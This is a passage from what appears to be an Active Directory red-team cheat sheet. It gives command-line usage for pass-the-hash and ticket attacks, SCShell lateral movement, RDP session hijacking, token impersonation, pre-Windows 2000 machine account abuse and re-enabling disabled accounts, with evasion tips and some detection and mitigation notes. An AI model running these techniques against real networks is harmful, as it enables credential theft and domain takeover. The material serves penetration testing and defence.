Receive hashes: Responder captures NTLMv2 → crack with hashcat 5600 or relay

Naming trick: Prefix with @ or space to sort first in directory listing

Requires: Write access to a share that users browse (SYSVOL, department shares, etc.)

Pass-the-Ticket (PtT): Inject stolen Kerberos TGT/TGS into current session — Rubeusptt /ticket:base64

Overpass-the-Hash: Use NT hash to request a Kerberos TGT — Rubeusasktgt /user:X /rc4:HASH. Converts NTLM material to Kerberos for environments blocking NTLM

Pass-the-Key: Same as overpass but using AES256 key instead of RC4/NT hash — less detectable, preferred when available

Pass-the-Certificate: Use stolen ADCS certificate for PKINIT auth — Certipyauth -pfx cert.pfx

RDP Restricted Admin: mstsc /restrictedadmin allows RDP with just NT hash — must be enabled on target

Detection: Event 4624 Type 9 (PtH), 4768 with unusual encryption types (overpass), anomalous logon patterns

LATERAL

SCShell & Service-Based Execution

Fileless lateral movement via service configuration changes — no new service creation, port 135 only

SCShell: Changes an existing service's binary path via ChangeServiceConfigA → starts service → code executes → restores original path

No Event 7045: Unlike PsExec, SCShell modifies existing services instead of creating new ones — avoids the #1 lateral movement detection

Port 135 only: Uses DCERPC/SVCCTL — does not require SMB (445) for file transfer

Fileless: No binary dropped to disk — the service binary path points to a command line (e.g., cmd /c payload)

XOR encrypted: Network traffic is XOR-encrypted to avoid signature detection

Authentication: Supports pass-the-hash natively — SCShell.exe target service user domain hash command

Modified SCShell: Find stopped services with DLLs NOT in System32 — replace the DLL and start the service. No config change needed, even stealthier

OPSEC: Event 7040 (service config change) may still fire — but far less monitored than 7045 (new service)

LATERAL

RDP Session Hijacking

Take over disconnected RDP sessions without credentials

Disconnected RDP sessions remain active in memory with the user's token

With SYSTEM privileges on the RDP host, you can connect to any disconnected session

query user — list active and disconnected sessions

tscon TARGET_SESSION_ID /dest:YOUR_SESSION — switch to target session

If running as SYSTEM via PsExec -s: tscon 2 /dest:console

No password needed — SYSTEM can hijack any session on the machine

Useful when: DA/privileged user has a disconnected session on a compromised host

Cobalt Strike: steal_token PID to impersonate, rev2self to revert. make_token for credential-based impersonation

GodPotato / JuicyPotato / SweetPotato — SeImpersonate → SYSTEM

PrintSpoofer — SeImpersonate → SYSTEM via Spooler pipe

RunasCs: Runas replacement with PTH support (dev branch) — create process with alternate credentials

Delegation tokens: Users logged in interactively — can be fully impersonated

Impersonation tokens: Network logons — limited to local resource access

OPSEC: Token theft is local — no network traffic, no new logon events. One of the quietest escalation techniques

Requirement: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

CREDPRIVESC

Pre-Windows 2000 Computer Account Abuse

Machine accounts created with "Pre-Windows 2000" checkbox have predictable passwords → authenticate as machine → lateral movement / domain compromise

The vulnerability: When a computer account is created with "Assign this computer account as a pre-Windows 2000 computer" checked (or via certain automated provisioning), the password is set to the machine name in lowercase (e.g., WORKSTATION01$ → password: workstation01)

Why it persists: The password is only changed when the machine actually joins the domain and performs its first password rotation — if the machine never joins (staged accounts, decommissioned hosts, provisioning errors), the predictable password remains forever

Pre-Windows 2000 Compatible Access group: Members of this group (often includes "Authenticated Users" or "Everyone" by default) can perform anonymous LDAP enumeration — list users, groups, computers without any credentials

Enumeration: pre2k unauth — scan for pre2k accounts without credentials (anonymous LDAP bind)

pre2k auth -d corp.local -u user -p pass — authenticated enumeration of pre-Windows 2000 computer accounts

netexec ldap DC -u '' -p '' --pre2k — anonymous enumeration of pre2k accounts via LDAP

Authentication: getTGT.py corp.local/WORKSTATION01$ -dc-ip DC_IP (password: workstation01) — request TGT for the machine account

Exploitation paths once authenticated as machine account:

1. Silver Ticket: Forge service tickets for services running on that host

2. RBCD: If you have GenericWrite on another computer, set RBCD → S4U chain → admin access

3. S4U2Self: If the account has constrained delegation configured, use S4U2Self + S4U2Proxy to impersonate any user

4. Credential relay: Use the machine account for NTLM relay attacks to other services

5. LAPS: Machine accounts can read their own LAPS password — if LAPS is deployed, you get local admin on that host

Mass exploitation: Organizations with automated provisioning may have hundreds of pre2k accounts with predictable passwords — one script to authenticate them all

OPSEC: Machine account authentication generates Event 4624 Type 3 and 4768 (TGT request) — blends with normal machine auth, very low detection risk

Detection: Monitor for TGT requests from machine accounts that haven't performed machine password rotation (pwdLastSet matches creation date)

Mitigation: Audit all computer accounts where pwdLastSet equals whenCreated; force password rotation or delete unused pre-staged accounts; remove "Everyone" and "Authenticated Users" from Pre-Windows 2000 Compatible Access group

ACLPRIVESC

The Walking Dead — Disabled Object Abuse

Disabled/forgotten AD accounts with residual ACLs → re-enable → privilege escalation

Disabled AD accounts are often not deleted — they retain their group memberships, ACLs, and attributes

Other principals may still have inbound ACL relationships (GenericAll, GenericWrite, WriteDACL) pointing to disabled accounts

If you have sufficient DACL permissions on a disabled account, you can re-enable it

Attack: Find disabled privileged account → verify you have GenericAll/WriteDACL → re-enable → authenticate as that user

LazarusWakeUp find-all — discover all disabled objects with exploitable ACLs

LazarusWakeUp enable -t targetUser — re-enable the disabled account

Also works with disabled computer accounts — same principle applies

Why overlooked? BloodHound marks disabled accounts differently — most attackers skip them entirely

OPSEC: Re-enabling triggers Event ID 4722 (user account enabled) — detectable with Sigma rules

Mitigation: Delete disabled accounts instead of just disabling them, audit ACLs on disabled objects regularly

Why does this work? Disabling an account only flips the ACCOUNTDISABLE flag in userAccountControl. All ACLs, group memberships, SPNs, and attributes remain intact. The "dead" account is still fully wired into AD's permission graph — it just can't authenticate. Re-enabling it brings all those privileges back to life instantly.

ACLPRIVESC

AD Recycle Bin — Deleted Object Exploitation

Restore deleted AD objects to recover privileges, group memberships, and credentials

AD Recycle Bin (Windows Server 2008 R2+) preserves all attributes of deleted objects for 180 days
